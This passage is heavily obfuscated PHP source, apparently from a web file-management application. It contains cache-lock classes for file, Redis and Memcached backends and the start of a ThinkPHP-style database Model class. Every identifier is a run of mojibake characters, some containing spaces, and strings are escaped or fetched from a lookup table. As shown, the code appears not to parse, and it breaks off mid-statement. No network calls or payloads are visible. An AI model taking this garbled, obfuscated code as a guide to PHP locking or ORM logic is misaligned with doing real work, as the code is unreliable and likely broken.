"\154\157\x63\153\x20\145\x72\x72\x6f\162\x3b\153\145\x79\75{$ÃŞÑ¬§ì}\73\164\x69\x6d\x65\75{$†úÜÃË‡}\x3b" . self::$errorMsg . $çš×Ö¦[74] . get_caller_msg(); $ €¤Ãà§ = LNG($çš×Ö¦[936]) . "\x28{$†úÜÃË‡}\x73\51\x2e" . LNG($çš×Ö¦[937]); $ €¤Ãà§ .= $çš×Ö¦[938]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ €¤Ãà§ = $ €¤Ãà§ . $çš×Ö¦[939] . self::$errorMsg; } write_log($çš×Ö¦[940] . sprintf($çš×Ö¦[941], timeFloat() - $ñØéä¸) . $çš×Ö¦[942] . $öºÃÎ‡¶ . $çš×Ö¦[943] . json_encode(error_get_last()), $çš×Ö¦[933]); show_json($ €¤Ãà§, !1); } if (!$úÛÊ†Ÿ) { self::$lockItem[$é¦ıªŸò] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‹šûË–º = number_format(timeFloat() - $ú±¶ß±’, 3); write_log($çš×Ö¦[944] . $ÃŞÑ¬§ì . $çš×Ö¦[945] . $‹šûË–º, $çš×Ö¦[933]); } return $ê¡¹Ò·; } public static function lockGet($†öÂÃ³¯) { $åÃ•ÇíÅ = self::key($†öÂÃ³¯); if (self::$lockItem[$åÃ•ÇíÅ]) { return self::$lockItem[$åÃ•ÇíÅ]; } return self::init()->lockGet($åÃ•ÇíÅ); } public static function unlock($ÓÄ•ÅõÒ) { $Ö¸Ò™‡ =& $_SERVER[¡¬ıÜ ƒ]; $‰°÷ˆä› = self::key($ÓÄ•ÅõÒ); self::$lockItem[$‰°÷ˆä›] = null; self::init()->unlock($‰°÷ˆä›); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ö¸Ò™‡[946] . $ÓÄ•ÅõÒ, $Ö¸Ò™‡[933]); } return; } public static function unlockRuntime() { $‡–¹Ë¶ =& $_SERVER[¡¬ıÜ ƒ]; $Ûİ¯½¸› = self::init(); $˜š¸½±€ = !1; foreach (self::$lockItem as $ôÉ¼Á»Ç => $û¾¯œûê) { if (!$û¾¯œûê) { continue; } $Ûİ¯½¸›->unlock($ôÉ¼Á»Ç); if (!$˜š¸½±€) { $˜š¸½±€ = !0; write_log($‡–¹Ë¶[947] . $ôÉ¼Á»Ç . $‡–¹Ë¶[74] . get_caller_msg(), $‡–¹Ë¶[933]); continue; } write_log($‡–¹Ë¶[947] . $ôÉ¼Á»Ç, $‡–¹Ë¶[933]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ûíîòµè = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‡–¹Ë¶[948] . $Ûíîòµè . $‡–¹Ë¶[949] . ACTION, $‡–¹Ë¶[933]); } } public static function fileLock($ñâÓ‹ãĞ) { $ü§µ ÄÊ =& $_SERVER[¡¬ıÜ ƒ]; if (!$GLOBALS[$ü§µ ÄÊ[950]]) { $GLOBALS[$ü§µ ÄÊ[950]] = array(); } $GLOBALS[$ü§µ ÄÊ[950]][$ñâÓ‹ãĞ] = !1; $Ì“¨•ºµ = fopen(DATA_PATH . $ñâÓ‹ãĞ . $ü§µ ÄÊ[951], $ü§µ ÄÊ[952]); if (!$Ì“¨•ºµ) { return !1; } $GLOBALS[$ü§µ ÄÊ[950]][$ñâÓ‹ãĞ] = $Ì“¨•ºµ; if (flock($Ì“¨•ºµ, LOCK_EX)) { return !0; } self::unlock($ñâÓ‹ãĞ); show_json($ü§µ ÄÊ[953], !1); return !1; } public static function fileUnlock($ûÊæş ö) { $ªâ½’¹¥ =& $_SERVER[¡¬ıÜ ƒ]; $…‘Şµ‚Õ = $GLOBALS[$ªâ½’¹¥[950]][$ûÊæş ö]; if (!$…‘Şµ‚Õ) { return; } $GLOBALS[$ªâ½’¹¥[950]][$ûÊæş ö] = !1; flock($…‘Şµ‚Õ, LOCK_UN); fclose($…‘Şµ‚Õ); } public static function fileUnlockAll() { $Ê×·õï =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($GLOBALS[$Ê×·õï[950]]) || !$GLOBALS[$Ê×·õï[950]]) { return; } foreach ($GLOBALS[$Ê×·õï[950]] as $ô£Îåş => $¦‘ê“‰µ) { if (!$¦‘ê“‰µ) { continue; } $GLOBALS[$Ê×·õï[950]][$ô£Îåş] = !1; flock($¦‘ê“‰µ, LOCK_UN); fclose($¦‘ê“‰µ); } $GLOBALS[$Ê×·õï[950]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto f²×Æì¨Ô¤; f²×Æì¨Ô¤: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $²ù§İ» =& $_SERVER[¡¬ıÜ ƒ]; $ı‚‹û‘î = $GLOBALS[$²ù§İ»[6]][$²ù§İ»[426]]; self::$cachePath = $ı‚‹û‘î[$²ù§İ»[232]][$²ù§İ»[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÚÖÅÖœ, $ª•Ï­î = 0) { $µë±€õ‹ =& $_SERVER[¡¬ıÜ ƒ]; $›“ûÈÇô = microtime(!0); $ï–¯¥ = $›“ûÈÇô + $ª•Ï­î + 0.0001; $çùÍÀºâ = rtrim(self::$cachePath, $µë±€õ‹[8]) . $µë±€õ‹[954] . md5($ÚÖÅÖœ) . $µë±€õ‹[951]; if (file_exists($çùÍÀºâ) && filemtime($çùÍÀºâ) && filemtime($çùÍÀºâ) < time() - 10) { @unlink($çùÍÀºâ); } do { if (file_exists($çùÍÀºâ)) { cacheLockWait(); continue; } $¬²†òËÓ = fopen($çùÍÀºâ, $µë±€õ‹[955]); if (!$¬²†òËÓ) { return !1; } $¹ı®éËä = flock($¬²†òËÓ, LOCK_EX | LOCK_NB); self::$caches[$ÚÖÅÖœ] = array($µë±€õ‹[956] => $¬²†òËÓ, $µë±€õ‹[232] => $çùÍÀºâ); fwrite($¬²†òËÓ, $ï–¯¥); clearstatcache(); if ($¬²†òËÓ && $¹ı®éËä) { return !0; } cacheLockWait(); } while (microtime(!0) < $ï–¯¥); $this->unlock($ÚÖÅÖœ); return !1; } public function lockGet($ªÌë‘Ü¼) { $¼·Íßõ³ =& $_SERVER[¡¬ıÜ ƒ]; $÷€™Ğ”¬ = rtrim(self::$cachePath, $¼·Íßõ³[8]) . $¼·Íßõ³[954] . md5($ªÌë‘Ü¼) . $¼·Íßõ³[951]; return file_exists($÷€™Ğ”¬); } public function unlock($Á»¸Ş½“) { $àÚüŸ¯õ =& $_SERVER[¡¬ıÜ ƒ]; $Ğ€ªöŞ¢ = self::$caches[$Á»¸Ş½“]; if (!$Ğ€ªöŞ¢) { return; } @flock($Ğ€ªöŞ¢[$àÚüŸ¯õ[956]], LOCK_UN); @fclose($Ğ€ªöŞ¢[$àÚüŸ¯õ[956]]); @unlink($Ğ€ªöŞ¢[$àÚüŸ¯õ[232]]); unset(self::$caches[$Á»¸Ş½“]); } } class CacheLockRedis { public function lock($‹ªîø®Ï, $±ˆÇÑâ® = 10) { $ìôíåğá = Cache::init(); $ºìª«Î = microtime(!0) + $±ˆÇÑâ®; while (microtime(!0) < $ºìª«Î) { $ˆö™Ä¿É = $ìôíåğá->get($‹ªîø®Ï); if (!$ˆö™Ä¿É) { $¬˜›º¬ = $ìôíåğá->setLock($‹ªîø®Ï, $ºìª«Î, $±ˆÇÑâ®); if ($¬˜›º¬) { return !0; } } else { if ($ˆö™Ä¿É < microtime(!0)) { $ìôíåğá->set($‹ªîø®Ï, $ºìª«Î, $±ˆÇÑâ® * 2); if ($ìôíåğá->get($‹ªîø®Ï) === $ˆö™Ä¿É) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ş—÷È´ä) { return Cache::init()->get($Ş—÷È´ä); } public function unlock($¼—¹ßË) { return Cache::init()->remove($¼—¹ßË); } } class CacheLockMemcached { public function lock($ˆ—ÇÀÃş, $ìÜ—öó = 0) { $¶İ–ï¦Á = Cache::init(); $±‹ğá¥ş = microtime(!0) + $ìÜ—öó; while (microtime(!0) < $±‹ğá¥ş) { $óø¶¢“„ = $¶İ–ï¦Á->get($ˆ—ÇÀÃş); if (!$óø¶¢“„ || $óø¶¢“„ < microtime(!0)) { $Ÿ±‰†³¬ = $¶İ–ï¦Á->handle->add($ˆ—ÇÀÃş, $±‹ğá¥ş, $ìÜ—öó); if ($Ÿ±‰†³¬) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ çæŞ¼Õ) { return Cache::init()->get($ çæŞ¼Õ); } public function unlock($ö¯Åºü‰) { return Cache::init()->remove($ö¯Åºü‰); } } goto b¥¼ŠóİØ; Aåñ­‚‚: define($_SERVER[¡¬ıÜ ƒ][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\x6f\162\144\145\162", "\x61\154\151\141\163", "\x68\x61\166\151\x6e\147", "\x67\x72\x6f\165\x70", "\x6c\x6f\143\x6b", "\x64\151\x73\164\151\x6e\143\164", "\141\x75\164\157", "\146\151\154\x74\145\x72", "\166\x61\154\151\x64\x61\164\145", "\x72\x65\163\165\154\164", "\x62\x69\x6e\144", "\164\x6f\x6b\145\x6e"); public function __construct($¥œ€šè÷ = '', $‹û«ÍíÎ = '', $–Ò™¿…· = '') { $Ï¤ş™£Á =& $_SERVER[¡¬ıÜ ƒ]; $this->_initialize(); if (!empty($¥œ€šè÷)) { if (strpos($¥œ€šè÷, $Ï¤ş™£Á[10])) { list($this->dbName, $this->name) = explode($Ï¤ş™£Á[10], $¥œ€šè÷); } else { $this->name = $¥œ€šè÷; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($‹û«ÍíÎ)) { $this->tablePrefix = $Ï¤ş™£Á[12]; } elseif ($Ï¤ş™£Á[12] != $‹û«ÍíÎ) { $this->tablePrefix = $‹û«ÍíÎ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ï¤ş™£Á[323]); } $this->db(0, empty($this->connection) ? $–Ò™¿…· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‰úŠİˆË =& $_SERVER[¡¬ıÜ ƒ]; if (empty($this->fields)) { if (think_config($‰úŠİˆË[324])) { $û­³èÔõ = $this->dbName ? $this->dbName : think_config($‰úŠİˆË[325]); $šµ™À¨½ = think_var_cache($‰úŠİˆË[326] . strtolower(get_path_this($û­³èÔõ) . $‰úŠİˆË[10] . $this->name)); if ($šµ™À¨½) { $ÂÖ‘¯Òå = think_config($‰úŠİˆË[327]); if (empty($ÂÖ‘¯Òå) || $šµ™À¨½[$‰úŠİˆË[328]] == $ÂÖ‘¯Òå) { $this->fields = $šµ™À¨½; return; } } } $this->flush(); } } public function flush() { $ÆÇÙí…° =& $_SERVER[¡¬ıÜ ƒ]; $this->db->setModel($this->name); $€ğÖô—£ = $this->db->getFields($this->getTableName()); if (!$€ğÖô—£) { return !1; } $this->fields = array_keys($€ğÖô—£); $this->fields[$ÆÇÙí…°[329]] = !1; foreach ($€ğÖô—£ as $Ñ¯é×Üº => $â²íÁ†) { $à‚Ù¡’[$Ñ¯é×Üº] = $â²íÁ†[$ÆÇÙí…°[33]]; if ($â²íÁ†[$ÆÇÙí…°[39]]) { $this->fields[$ÆÇÙí…°[330]] = $Ñ¯é×Üº; if ($â²íÁ†[$ÆÇÙí…°[42]]) { $this->fields[$ÆÇÙí…°[329]] = !0; } } } $this->fields[$ÆÇÙí…°[331]] = $à‚Ù¡’; if (think_config($ÆÇÙí…°[327])) { $this->fields[$ÆÇÙí…°[328]] = think_config($ÆÇÙí…°[327]); } if (think_config($ÆÇÙí…°[324])) { $²«—÷ğ” = $this->dbName ? $this->dbName : think_config($ÆÇÙí…°[325]); think_var_cache($ÆÇÙí…°[326] . strtolower(get_path_this($²«—÷ğ”) . $ÆÇÙí…°[10] . $this->name), $this->fields); } } public function switchModel($’´ÈÖŸ, $ÃØ²êºø = array()) { $è¬¹¢í  =& $_SERVER[¡¬ıÜ ƒ]; $õ„ŞïÍá = ucwords(strtolower($’´ÈÖŸ)) . $è¬¹¢í [332]; if (!class_exists($õ„ŞïÍá)) { think_exception($õ„ŞïÍá . think_lang($è¬¹¢í [333])); } $this->_extModel = new $õ„ŞïÍá($this->name); if (!empty($ÃØ²êºø)) { foreach ($ÃØ²êºø as $Ö´ñ‚¿š) { $this->_extModel->setProperty($Ö´ñ‚¿š, $this->{$Ö´ñ‚¿š}); } } return $this->_extModel; } public function __set($½›‰™ğé, $‚†…ÆÔ) { $this->data[$½›‰™ğé] = $‚†…ÆÔ; } public function __get($ÓÊ©ñ²Ğ) { return isset($this->data[$ÓÊ©ñ²Ğ]) ? $this->data[$ÓÊ©ñ²Ğ] : null; } public function __isset($ºê‹ÈÉË) { return isset($this->data[$ºê‹ÈÉË]); } public function __unset($ñ÷å•œ’) { unset($this->data[$ñ÷å•œ’]); } public function __call($°é»òîÏ, $ÇÛØ£Ö–) { $Ãœƒ›í½ =& $_SERVER[¡¬ıÜ ƒ]; if (in_array(strtolower($°é»òîÏ), $this->methods, !0)) { $this->options[strtolower($°é»òîÏ)] = $ÇÛØ£Ö–[0]; return $this; } elseif (in_array(strtolower($°é»òîÏ), array($Ãœƒ›í½[334], $Ãœƒ›í½[335], $Ãœƒ›í½[336], $Ãœƒ›í½[337], $Ãœƒ›í½[338]), !0)) { $–©½ĞØè = isset($ÇÛØ£Ö–[0]) ? $ÇÛØ£Ö–[0] : $Ãœƒ›í½[222]; $–©½ĞØè = $this->db->parseKey($–©½ĞØè); return $this->getField(strtoupper($°é»òîÏ) . $Ãœƒ›í½[339] . $–©½ĞØè . $Ãœƒ›í½[340] . $°é»òîÏ, $Ãœƒ›í½[334]); } elseif (strtolower(substr($°é»òîÏ, 0, 5)) == $Ãœƒ›í½[341]) { $–©½ĞØè = think_parse_name(substr($°é»òîÏ, 5)); $†ÔÑù¢ü[$–©½ĞØè] = $ÇÛØ£Ö–[0]; return $this->where($†ÔÑù¢ü)->find(); } elseif (strtolower(substr($°é»òîÏ, 0, 10)) == $Ãœƒ›í½[342]) { $ã•åÓíå = think_parse_name(substr($°é»òîÏ, 10)); $†ÔÑù¢ü[$ã•åÓíå] = $ÇÛØ£Ö–[0]; return $this->where($†ÔÑù¢ü)->getField($ÇÛØ£Ö–[1]); } elseif (isset($this->_scope[$°é»òîÏ])) { return $this->scope($°é»òîÏ, $ÇÛØ£Ö–[0]); } elseif (method_exists($this, $°é»òîÏ)) { array_unshift($ÇÛØ£Ö–, $°é»òîÏ); return call_user_func_array(array($this, $Ãœƒ›í½[343]), $ÇÛØ£Ö–); } else { return call_user_func_array(array(parent, $°é»òîÏ), $ÇÛØ£Ö–); } } protected function call() { $ŠåÆ‘Ş =& $_SERVER[¡¬ıÜ ƒ]; $ºÌ§Ô» = func_get_args(); $…üÕ’© = array_shift($ºÌ§Ô»); $Ú˜£ëæ¡ = $…üÕ’©; if (is_array($…üÕ’©)) { $Ú˜£ëæ¡ = $…üÕ’©[1]; $…üÕ’© = $…üÕ’©[0]; } $ôª‹•“° = count($ºÌ§Ô») - 1; if (isset($ºÌ§Ô»[$ôª‹•“°]) && $ºÌ§Ô»[$ôª‹•“°] === $…üÕ’©) { think_exception(__CLASS__ . $ŠåÆ‘Ş[4] . $…üÕ’© . think_lang($ŠåÆ‘Ş[344])); return; } $ºÌ§Ô»[] = $…üÕ’©; if (method_exists($this, $ŠåÆ‘Ş[345])) { $×‘«»†ü = call_user_func_array(array($this, $ŠåÆ‘Ş[346]), array($Ú˜£ëæ¡, $ºÌ§Ô»)); if (!is_null($×‘«»†ü) && $×‘«»†ü !== !1) { return $×‘«»†ü; } } $™¨Á¸Æ® = call_user_func_array(array($this, $…üÕ’©), $ºÌ§Ô»); if (method_exists($this, $ŠåÆ‘Ş[347])) { $×‘«»†ü = call_user_func_array(array($this, $ŠåÆ‘Ş[348]), array($Ú˜£ëæ¡, $ºÌ§Ô», $™¨Á¸Æ®)); if ($×‘«»†ü) { return $×‘«»†ü; } } return $™¨Á¸Æ®; } protected function _initialize() { } protected function _facade($â±ŒÎ”ù) { $¿—ĞòŞï =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($this->fields)) { foreach ($â±ŒÎ”ù as $ƒı¾£Ï => $Éìé­ş) { if (is_array($this->fields) && !in_array($ƒı¾£Ï, $this->fields, !0)) { unset($â±ŒÎ”ù[$ƒı¾£Ï]); } elseif (is_scalar($Éìé­ş)) { $this->_parseType($â±ŒÎ”ù, $ƒı¾£Ï); } } } if (!empty($this->options[$¿—ĞòŞï[349]])) { $â±ŒÎ”ù = array_map($this->options[$¿—ĞòŞï[349]], $â±ŒÎ”ù); unset($this->options[$¿—ĞòŞï[349]]); } $this->_beforeWrite($â±ŒÎ”ù); return $â±ŒÎ”ù; } protected function _beforeWrite(&$Ä‰¼²Š®) { } public function add($ˆñ¥Öíé = '', $–ü½ß¯ï = array(), $‚–†åÒÜ = false) { if (empty($ˆñ¥Öíé)) { if (!empty($this->data)) { $ˆñ¥Öíé = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¡¬ıÜ ƒ][350]); return !1; } } $–ü½ß¯ï = $this->_parseOptions($–ü½ß¯ï); $ˆñ¥Öíé = $this->_facade($ˆñ¥Öíé); if (!1 === $this->_beforeInsert($ˆñ¥Öíé, $–ü½ß¯ï)) { return !1; } $Êİ™¢ŠÔ = $this->db->insert($ˆñ¥Öíé, $–ü½ß¯ï, $‚–†åÒÜ); if (!1 !== $Êİ™¢ŠÔ) { $šËñãóº = $this->getLastInsID(); if ($šËñãóº) { $ˆñ¥Öíé[$this->getPk()] = $šËñãóº; $this->_after_insert($ˆñ¥Öíé, $–ü½ß¯ï); return $šËñãóº; } $this->_after_insert($ˆñ¥Öíé, $–ü½ß¯ï); } return $Êİ™¢ŠÔ; } protected function _beforeInsert(&$İÒ“ö¹™, $À„¹Í«·) { } protected function _after_insert($ƒñ±Åƒ—, $ÇÎÀÑ˜) { } public function addAll($ûØêş­, $ Æ‘ ® = array(), $Ó÷“¤½ã = false) { $ñ±µÓÏ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($ûØêş­)) { $this->error = think_lang($ñ±µÓÏ[350]); return !1; } $ Æ‘ ® = $this->_parseOptions($ Æ‘ ®); foreach ($ûØêş­ as $ƒöü˜´ => $ú—ÈàÙú) { $ûØêş­[$ƒöü˜´] = $this->_facade($ú—ÈàÙú); } if (method_exists($this->db, $ñ±µÓÏ[351])) { $¹šŒ¡Ş = $this->db->insertAll($ûØêş­, $ Æ‘ ®, $Ó÷“¤½ã); } else { $this->startTrans(); foreach ($ûØêş­ as $ƒöü˜´ => $ú—ÈàÙú) { $¹šŒ¡Ş = $this->db->insert($ú—ÈàÙú, $ Æ‘ ®, $Ó÷“¤½ã); } $this->commit(); } if (!1 !== $¹šŒ¡Ş) { $œäº’£¹ = $this->getLastInsID(); if ($œäº’£¹) { return $œäº’£¹; } } return $¹šŒ¡Ş; } public function selectAdd($²ıÁ‘ = '', $Å ¾ô„ = '', $›ø …ÌŸ = array()) { $ÑÏãäÔÕ =& $_SERVER[¡¬ıÜ ƒ]; $›ø …ÌŸ = $this->_parseOptions($›ø …ÌŸ); if (!1 === ($²Æ×÷£Ò = $this->db->selectInsert($²ıÁ‘ ? $²ıÁ‘ : $›ø …ÌŸ[$ÑÏãäÔÕ[352]], $Å ¾ô„ ? $Å ¾ô„ : $this->getTableName(), $›ø …ÌŸ))) { $this->error = think_lang($ÑÏãäÔÕ[353]); return !1; } else { return $²Æ×÷£Ò; } } public function save($…Ã™«âö = '', $Å¬’…í› = array()) { $Ù¶Ç¼à‹ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($…Ã™«âö)) { if (!empty($this->data)) { $…Ã™«âö = $this->data; $this->data = array(); } else { $this->error = think_lang($Ù¶Ç¼à‹[350]); return !1; } } $…Ã™«âö = $this->_facade($…Ã™«âö); $Å¬’…í› = $this->_parseOptions($Å¬’…í›); $È¾•üõâ = $this->getPk(); if (!isset($Å¬’…í›[$Ù¶Ç¼à‹[354]])) { if (isset($…Ã™«âö[$È¾•üõâ])) { $˜‚¦Ä‹[$È¾•üõâ] = $…Ã™«âö[$È¾•üõâ]; $Å¬’…í›[$Ù¶Ç¼à‹[354]] = $˜‚¦Ä‹; unset($…Ã™«âö[$È¾•üõâ]); } else { $this->error = think_lang($Ù¶Ç¼à‹[353]); return !1; } } if (is_array($Å¬’…í›[$Ù¶Ç¼à‹[354]]) && isset($Å¬’…í›[$Ù¶Ç¼à‹[354]][$È¾•üõâ])) { $Á¸±  = $Å¬’…í›[$Ù¶Ç¼à‹[354]][$È¾•üõâ]; } if (!1 === $this->_beforeUpdate($…Ã™«âö, $Å¬’…í›)) { return !1; } $‡è‰«ú’ = $this->db->update($…Ã™«âö, $Å¬’…í›); if (!1 !== $‡è‰«ú’) { if (isset($Á¸± )) { $…Ã™«âö[$È¾•üõâ] = $Á¸± ; } $this->_afterUpdate($…Ã™«âö, $Å¬’…í›); } return $‡è‰«ú’; } protected function _beforeUpdate(&$õõôî¶¶, $Œ¦ÛŠëà) { } protected function _afterUpdate($—³ÒÇ…‘, $‚öŒÂªà) { } public function delete($Ûò´ÒÑÏ = array()) { $Ø”ùÁ¯‘ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($Ûò´ÒÑÏ) && empty($this->options[$Ø”ùÁ¯‘[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $éˆ—¾ç = $this->getPk(); if (is_numeric($Ûò´ÒÑÏ) || is_string($Ûò´ÒÑÏ)) { if (strpos($Ûò´ÒÑÏ, $Ø”ùÁ¯‘[50])) { $Â½ƒÈ°ª[$éˆ—¾ç] = array($Ø”ùÁ¯‘[355], $Ûò´ÒÑÏ); } else { $Â½ƒÈ°ª[$éˆ—¾ç] = $Ûò´ÒÑÏ; } $this->options[$Ø”ùÁ¯‘[354]] = $Â½ƒÈ°ª; } $Ûò´ÒÑÏ = $this->_parseOptions(); if (is_array($Ûò´ÒÑÏ[$Ø”ùÁ¯‘[354]]) && isset($Ûò´ÒÑÏ[$Ø”ùÁ¯‘[354]][$éˆ—¾ç])) { $õ”á®ü™ = $Ûò´ÒÑÏ[$Ø”ùÁ¯‘[354]][$éˆ—¾ç]; } $«²¤Å´¹ = $this->db->delete($Ûò´ÒÑÏ); if (!1 !== $«²¤Å´¹) { $ã¶··Ó¬ = array(); if (isset($õ”á®ü™)) { $ã¶··Ó¬[$éˆ—¾ç] = $õ”á®ü™; } $this->_after_delete($ã¶··Ó¬, $Ûò´ÒÑÏ); } return $«²¤Å´¹; } protected function _after_delete($¶±‡Ó°, $ğßÆã¹) { } public function select($­¶·´ˆ = array()) { $÷¶æúÊŠ =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($­¶·´ˆ) || is_numeric($­¶·´ˆ)) { $îÌ×¿‰ = $this->getPk(); if (strpos($­¶·´ˆ, $÷¶æúÊŠ[50])) { $†ş’‚¯”[$îÌ×¿‰] = array($÷¶æúÊŠ[355], $­¶·´ˆ); } else { $†ş’‚¯”[$îÌ×¿‰] = $­¶·´ˆ; } $this->options[$÷¶æúÊŠ[354]] = $†ş’‚¯”; } elseif (!1 === $­¶·´ˆ) { $­¶·´ˆ = $this->_parseOptions(); return $÷¶æúÊŠ[356] . $this->db->buildSelectSql($­¶·´ˆ) . $÷¶æúÊŠ[357]; } $­¶·´ˆ = $this->_parseOptions(); $ùş¶óĞ± = $this->db->select($­¶·´ˆ); if (!1 === $ùş¶óĞ±) { return !1; } if (empty($ùş¶óĞ±)) { return null; } $this->_afterSelect($ùş¶óĞ±, $­¶·´ˆ); return $ùş¶óĞ±; } protected function _afterSelect(&$åÁ«öï³, $ªÂÇÈ×ö) { } public function buildSql($Õ§ÇîŠä = array()) { $Ã·¬Ôîˆ =& $_SERVER[¡¬ıÜ ƒ]; $Õ§ÇîŠä = $this->_parseOptions($Õ§ÇîŠä); return $Ã·¬Ôîˆ[356] . $this->db->buildSelectSql($Õ§ÇîŠä) . $Ã·¬Ôîˆ[357]; } public function optionsValue($³è¡ˆµ¢ = null) { if (is_null($³è¡ˆµ¢)) { return $this->options; } elseif (is_array($³è¡ˆµ¢)) { $this->options = array_merge($this->options, $³è¡ˆµ¢); } } protected function _parseOptions($±â™˜Ö³ = array()) { $ò†ş€ì» =& $_SERVER[¡¬ıÜ ƒ]; if (is_array($±â™˜Ö³)) { $±â™˜Ö³ = array_merge($this->options, $±â™˜Ö³); } $this->options = array(); if (!isset($±â™˜Ö³[$ò†ş€ì»[358]])) { $±â™˜Ö³[$ò†ş€ì»[358]] = $this->getTableName(); $šö›¥ÒĞ = $this->fields; } else { $šö›¥ÒĞ = $this->getDbFields(); } if (!empty($±â™˜Ö³[$ò†ş€ì»[359]])) { $±â™˜Ö³[$ò†ş€ì»[358]] .= $ò†ş€ì»[53] . $±â™˜Ö³[$ò†ş€ì»[359]]; } $±â™˜Ö³[$ò†ş€ì»[360]] = $this->name; if (isset($±â™˜Ö³[$ò†ş€ì»[354]]) && is_array($±â™˜Ö³[$ò†ş€ì»[354]]) && !empty($šö›¥ÒĞ) && !isset($±â™˜Ö³[$ò†ş€ì»[361]]) && !isset($±â™˜Ö³[$ò†ş€ì»[358]])) { foreach ($±â™˜Ö³[$ò†ş€ì»[354]] as $ÁÌóÎ¤Ô => $çÒŞíŠŞ) { $ÁÌóÎ¤Ô = trim($ÁÌóÎ¤Ô); if (in_array($ÁÌóÎ¤Ô, $šö›¥ÒĞ, !0)) { if (is_scalar($çÒŞíŠŞ)) { $this->_parseType($±â™˜Ö³[$ò†ş€ì»[354]], $ÁÌóÎ¤Ô); } } elseif (!is_numeric($ÁÌóÎ¤Ô) && $ò†ş€ì»[11] != substr($ÁÌóÎ¤Ô, 0, 1) && !1 === strpos($ÁÌóÎ¤Ô, $ò†ş€ì»[10]) && !1 === strpos($ÁÌóÎ¤Ô, $ò†ş€ì»[339]) && !1 === strpos($ÁÌóÎ¤Ô, $ò†ş€ì»[214]) && !1 === strpos($ÁÌóÎ¤Ô, $ò†ş€ì»[286])) { unset($±â™˜Ö³[$ò†ş€ì»[354]][$ÁÌóÎ¤Ô]); } } } $this->_options_filter($±â™˜Ö³); return $±â™˜Ö³; } protected function _options_filter(&$æ·§ıİŒ) { } protected function _parseType(&$äëîˆ‚Ì, $€ù ±„Û) { $ù§Ü³¸¢ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($this->options[$ù§Ü³¸¢[362]][$ù§Ü³¸¢[4] . $€ù ±„Û])) { $Ñ µ€±Ş = strtolower($this->fields[$ù§Ü³¸¢[331]][$€ù ±„Û]); if (!1 !== strpos($Ñ µ€±Ş, $ù§Ü³¸¢[363])) { } elseif (!1 === strpos($Ñ µ€±Ş, $ù§Ü³¸¢[364]) && !1 !== strpos($Ñ µ€±Ş, $ù§Ü³¸¢[365])) { $äëîˆ‚Ì[$€ù ±„Û] = intval($äëîˆ‚Ì[$€ù ±„Û]); } elseif (!1 !== strpos($Ñ µ€±Ş, $ù§Ü³¸¢[366]) || !1 !== strpos($Ñ µ€±Ş, $ù§Ü³¸¢[367])) { $äëîˆ‚Ì[$€ù ±„Û] = floatval($äëîˆ‚Ì[$€ù ±„Û]); } elseif (!1 !== strpos($Ñ µ€±Ş, $ù§Ü³¸¢[368])) { $äëîˆ‚Ì[$€ù ±„Û] = (bool) $äëîˆ‚Ì[$€ù ±„Û]; } } } public function find($ƒ†º‡Ÿß = array()) { $Úü¶…ßè =& $_SERVER[¡¬ıÜ ƒ]; if (is_numeric($ƒ†º‡Ÿß) || is_string($ƒ†º‡Ÿß)) { $»äìäÏÓ[$this->getPk()] = intval($ƒ†º‡Ÿß); $this->options[$Úü¶…ßè[354]] = $»äìäÏÓ; } $this->options[$Úü¶…ßè[369]] = 1; $ƒ†º‡Ÿß = $this->_parseOptions(); $¾•ãÚÆ = $this->db->select($ƒ†º‡Ÿß); if (!1 === $¾•ãÚÆ) { return !1; } if (empty($¾•ãÚÆ)) { return null; } $this->data = $¾•ãÚÆ[0]; $this->_afterFind($this->data, $ƒ†º‡Ÿß); if (!empty($this->options[$Úü¶…ßè[370]])) { return $this->returnResult($this->data, $this->options[$Úü¶…ßè[370]]); } return $this->data; } protected function _afterFind(&$º°Ëé, $ö©•±øÎ) { } protected function returnResult($šçğÈ’ï, $õˆªæÎ… = '') { $¨³¬¤†Ì =& $_SERVER[¡¬ıÜ ƒ]; if ($õˆªæÎ…) { if (is_callable($õˆªæÎ…)) { return call_user_func($õˆªæÎ…, $šçğÈ’ï); } switch (strtolower($õˆªæÎ…)) { case $¨³¬¤†Ì[371]: return json_encode($šçğÈ’ï); case $¨³¬¤†Ì[372]: return xml_encode($šçğÈ’ï); } } return $šçğÈ’ï; } public function parseFieldsMap($ìÎ»º, $·Äùé®¯ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $×ùÈ¡Ù¸ => $¡û‘âÅ‰) { if ($·Äùé®¯ == 1) { if (isset($ìÎ»º[$¡û‘âÅ‰])) { $ìÎ»º[$×ùÈ¡Ù¸] = $ìÎ»º[$¡û‘âÅ‰]; unset($ìÎ»º[$¡û‘âÅ‰]); } } else { if (isset($ìÎ»º[$×ùÈ¡Ù¸])) { $ìÎ»º[$¡û‘âÅ‰] = 